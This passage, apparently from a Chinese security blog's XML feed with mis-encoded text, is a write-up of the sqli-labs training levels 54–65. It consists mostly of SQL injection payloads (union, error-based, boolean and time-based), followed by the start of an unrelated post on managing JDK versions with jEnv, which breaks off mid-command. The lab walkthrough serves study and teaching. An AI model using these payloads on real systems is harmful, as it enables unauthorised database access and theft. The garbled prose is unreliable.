class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å›æ˜¾çš„å­—æ®µ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœä¸º<code>HLBSTFO6HB</code>ï¼Œç»“æœä¸å”¯ä¸€<br>æŸ¥è¯¢åˆ—åï¼ˆè®°å¾—ä¿®æ”¹è¡¨åä¸ºä¸Šé¢çš„æŸ¥è¯¢ç»“æœï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-number">0x484c425354464f364842</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>åˆ—åä¸ºï¼šidã€secret_XBJJã€sessidã€tryy<br>æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼ˆä¿®æ”¹å­—æ®µåã€è¡¨åï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_XBJJ)+<span class="hljs-keyword">FROM</span>+HLBSTFO6HB)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>æœ€åæŸ¥åˆ°keyå€¼ä¸ºï¼š<code>kRTCQUzl170VXBxrCqlTWuyZ</code></p><hr><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=($id)</code><br>Less-55 ç»™äº† 14 æ¬¡å°è¯•æœºä¼šï¼Œä»£ç åŸºæœ¬ä¸Šæ²¡æœ‰å˜åŒ–ï¼Œåªæ˜¯é—­åˆæ–¹å¼å‘ç”Ÿäº†å˜åŒ–ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># éªŒè¯</span><br>?id=1) <span class="hljs-comment">--+</span><br><br><span class="hljs-comment"># æŸ¥è¯¢è¡¨å</span><br>?id=-1) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># P0ULLTHD09</span><br><br><span class="hljs-comment"># æŸ¥è¯¢å­—æ®µå</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-string">&#x27;P0ULLTHD09&#x27;</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># idã€sessidã€secret_0SECã€tryy</span><br><br><span class="hljs-comment"># æŸ¥è¯¢keyå€¼</span><br>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(secret_0SEC)+<span class="hljs-keyword">FROM</span>+P0ULLTHD09)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># hSoUfCvuUNHhjG8CQInhuVv2</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>é—­åˆæ–¹å¼ä¸åŒã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æŸ¥è¯¢è¡¨å</span><br>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>é—­åˆæ–¹å¼ä¸åŒã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æŸ¥è¯¢è¡¨å</span><br>?id=-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>uname å’Œ pass éƒ½åªè¾“å‡ºæ•°ç»„ä¸­çš„ç»“æœï¼Œunion æŸ¥è¯¢æ— æ³•å›æ˜¾ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$unames=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<br>$pass = ($unames);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. $unames[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .$pass[$row[<span class="hljs-string">&#x27;id&#x27;</span>]];<br><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥å°è¯•è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(secret_OD68 )+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+WOO6ID239T+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=$id</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># çŒœæµ‹é—­åˆæ–¹å¼</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+     # æ­£å¸¸æ˜¾ç¤º</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;       <span class="hljs-comment"># æŠ¥é”™</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+    # æŠ¥é”™</span><br><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # æœ‰æ˜æ˜¾å»¶æ—¶</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+ # æ— å»¶æ—¶</span><br><br><span class="hljs-comment"># æŠ¥é”™æ³¨å…¥</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=ï¼ˆ&quot;$id&quot;ï¼‰</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># çŒœæµ‹é—­åˆæ–¹å¼</span><br>?<span class="hljs-attribute">id</span>=1        # æ­£å¸¸æ˜¾ç¤ºï¼ˆå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸º1ï¼‰<br>?<span class="hljs-attribute">id</span>=1--+     # æ­£å¸¸æ˜¾ç¤ºï¼ˆå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸º1ï¼‰<br>?<span class="hljs-attribute">id</span>=1&#x27;       # æ­£å¸¸æ˜¾ç¤ºï¼ˆå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸º1ï¼‰<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # æ­£å¸¸æ˜¾ç¤ºï¼ˆå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸º1ï¼‰<br>?<span class="hljs-attribute">id</span>=1&quot;       # æŠ¥é”™,å¹¶èƒ½çœ‹åˆ°éœ€è¦æ·»åŠ æ‹¬å·ã€‚<br>?<span class="hljs-attribute">id</span>=1&quot;) --+  # æ­£å¸¸æ˜¾ç¤º<br><br><span class="hljs-comment"># æŠ¥é”™æ³¨å…¥</span><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">or</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=((&#39;$id&#39;))</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># çŒœæµ‹é—­åˆæ–¹å¼ï¼ˆè‡ªå·±æ‰‹åŠ¨å¤šæ¬¡åï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨Burp Suite+å­—å…¸è¿›è¡Œæµ‹è¯•ï¼‰</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;         <span class="hljs-comment"># æŠ¥é”™ï¼Œå¹¶ä¸”çœ‹åˆ°éœ€è¦æ·»åŠ åŒå±‚æ‹¬å·</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-comment">--+   # æ­£å¸¸æ˜¾ç¤º</span><br><br><span class="hljs-comment"># æŠ¥é”™æ³¨å…¥</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;)) <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>ä¸èƒ½æŠ¥é”™æ³¨å…¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># çŒœæµ‹é—­åˆæ–¹å¼(åœ¨çŒœæµ‹æ—¶ï¼Œæœ€å¥½åˆ—ä¸¾ä¸€ä¸ªæ¯”è¾ƒå…¨é¢çš„é—­åˆæ–¹å¼æ¥çŒœæµ‹)</span><br>?<span class="hljs-attribute">id</span>=1        # æ­£å¸¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=1&#x27;       # æŠ¥é”™ï¼ˆæ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=1&#x27;)--+   # æ­£å¸¸æ˜¾ç¤º<br><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># å¸ƒå°”æ³¨å…¥</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # ä¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # æ­£å¸¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # æ­£å¸¸æ˜¾ç¤º<br><br><span class="hljs-comment"># å»¶æ—¶æ³¨å…¥</span><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, sleep(3), 0)--+    # ä¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, sleep(3), 0)--+    # æ˜æ˜¾å»¶æ—¶<br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, sleep(3), 0)--+   # æ˜æ˜¾å»¶æ—¶<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>ç±»ä¼¼less-62</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># çŒœæµ‹é—­åˆæ–¹å¼</span><br>?<span class="hljs-attribute">id</span>=1        # æ­£å¸¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=1&#x27;       # æŠ¥é”™<br>?<span class="hljs-attribute">id</span>=1&#x27;--+    # æ­£å¸¸æ˜¾ç¤º<br><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br><span class="hljs-comment"># å¸ƒå°”æ³¨å…¥</span><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;s&#x27;</span>, 1, 0)--+    # ä¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 1)=<span class="hljs-string">&#x27;c&#x27;</span>, 1, 0)--+    # æ­£å¸¸æ˜¾ç¤º<br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(left(database(), 2)=<span class="hljs-string">&#x27;ch&#x27;</span>, 1, 0)--+   # æ­£å¸¸æ˜¾ç¤º<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(($id))</code></p><p>ç±»ä¼¼less-62</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+    # æ˜æ˜¾å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&quot;$id&quot;)</code></p><p>ç±»ä¼¼less-62</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-attr">id=0&quot;)</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+    <span class="hljs-comment"># æ˜æ˜¾å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><h1 id="6-æ€ç»´å¯¼å›¾"><a href="#6-æ€ç»´å¯¼å›¾" class="headerlink" title="6 æ€ç»´å¯¼å›¾"></a>6 æ€ç»´å¯¼å›¾</h1><p>è‡ªå·±æ€»ç»“çš„æ€ç»´å¯¼å›¾ã€‚å¦‚æœæœ‰æ›´å¥½çš„æƒ³æ³•ï¼Œæ¬¢è¿å’Œæˆ‘äº¤æµ<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210115123359.png"></p><p>å¹•å¸ƒåœ°å€ï¼š<a href="https://share.mubu.com/doc/qV0gisrYy6">https://share.mubu.com/doc/qV0gisrYy6</a></p><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-labæ•™ç¨‹â€”â€”1-35é€šå…³Writeup-åœ°å€ch3nye.top</a></li><li><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs é¶åœºç²¾ç®€å­¦ä¹ è®°å½•-å›½å…‰</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOSåˆ‡æ¢JDKç‰ˆæœ¬çš„æœ€ä½³å§¿åŠ¿</title>
    <link href="/2021/01/04/2021%E5%B9%B41%E6%9C%884%E6%97%A5-MacOS%E5%88%87%E6%8D%A2JDK%E7%89%88%E6%9C%AC%E7%9A%84%E6%9C%80%E4%BD%B3%E5%A7%BF%E5%8A%BF/"/>
    <url>/2021/01/04/2021%E5%B9%B41%E6%9C%884%E6%97%A5-MacOS%E5%88%87%E6%8D%A2JDK%E7%89%88%E6%9C%AC%E7%9A%84%E6%9C%80%E4%BD%B3%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>jEnv æ˜¯ MacOS ä¸€ä¸ªç®¡ç† Java ç‰ˆæœ¬çš„å¼€æºå·¥å…·ï¼Œè¿™æ˜¯å®ƒçš„<a href="https://www.jenv.be/">å®˜æ–¹æ–‡æ¡£</a>ï¼ŒåŒæ—¶æ”¯æŒ Linux å’Œ MacOSã€‚æˆ‘æœ€è¿‘åœ¨æ›´æ–° Burp Suite çš„æ—¶å€™ç”¨åˆ°äº†è¿™ä¸ªå·¥å…·è§‰å¾—æŒºä¸é”™çš„ã€‚</p><h1 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1 å®‰è£…"></a>1 å®‰è£…</h1><p>Linux / OS X</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/jenv/jenv.git ~/.jenv<br></code></pre></td></tr></table></figure><p>Mac OS ä½¿ç”¨ Homebrew å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ brew install jenv<br></code></pre></td></tr></table></figure><h1 id="2-åŸºæœ¬ç”¨æ³•"><a href="#2-åŸºæœ¬ç”¨æ³•" class="headerlink" title="2 åŸºæœ¬ç”¨æ³•"></a>2 åŸºæœ¬ç”¨æ³•</h1><p>jEnv å¹¶ä¸å…·å¤‡å®‰è£… Java ç‰ˆæœ¬å’Œåˆ é™¤ç‰ˆæœ¬çš„åŠŸèƒ½ï¼Œåªæ˜¯çœå»äº†åƒ<a href="https://juejin.cn/post/6871959224314757134">è¿™ä¸ªæ•™ç¨‹</a>ä¸€æ ·é…ç½®ç¯å¢ƒå˜é‡çš„éº»çƒ¦ï¼Œæ‰€ä»¥æ•™ç¨‹ä¸­ä¾ç„¶ä½¿ç”¨ HomeBrew å®‰è£… JDKã€‚</p><h2 id="2-1-JDKå®‰è£…"><a href="#2-1-JDKå®‰è£…" class="headerlink" title="2.1 JDKå®‰è£…"></a>2.1 JDKå®‰è£…</h2><p>2019 å¹´ä¹‹å, Oracle å¯¹ Java çš„å•†ä¸šæ¨¡å¼è¿›è¡Œäº†ä¸€ç³»åˆ—æ”¹é©, å¤šç§ç‰ˆæœ¬çš„ JDK å¼€å§‹å‡ºç°åœ¨å¼€å‘è€…çš„è§†é‡ä¸­.</p><p>æ•´ä½“æ¥çœ‹, å­˜åœ¨ä¸‰ä¸ªç‰ˆæœ¬çš„ JDK, åˆ†åˆ«æ˜¯ <strong>Oracle JDK</strong>ã€<strong>Oracle ç¼–è¯‘çš„ OpenJDK **å’Œ</strong>ç¬¬ä¸‰æ–¹å‚å•†ç¼–è¯‘çš„ OpenJDK**. å…¶å®ä¸‰è€…åœ¨åŠŸèƒ½ä¸Šå¹¶<strong>æ²¡æœ‰æ˜æ˜¾çš„å·®å¼‚</strong>ã€‚</p><p>å…¶ä¸­ OpenJDK æä¾›çš„ç‰ˆæœ¬æ›´ä¸ºå…¨é¢ï¼ŒAdoptOpenJDK æ˜¯å®Œå…¨å…è´¹çš„ã€æ— å“ç‰Œçš„ OpenJDK ç‰ˆæœ¬ï¼ŒåŸºäº GPL å¼€æºåè®®(+Classpath Extension), ä»¥å…è´¹è½¯ä»¶çš„å½¢å¼æä¾›ç¤¾åŒºç‰ˆçš„ OpenJDK äºŒè¿›åˆ¶åŒ…, å…¬å¸ä¹Ÿå¯å®‰å…¨ä¸”æ”¾å¿ƒä½¿ç”¨ã€‚</p><p>å³ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯å®‰è£…å„ç§ç‰ˆæœ¬çš„ jdkã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é€‰æ‹©è‡ªå·±éœ€è¦çš„ç‰ˆæœ¬</span><br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk8<br>$ brew install AdoptOpenJDK/openjdk/adoptopenjdk9<br>$ brew install 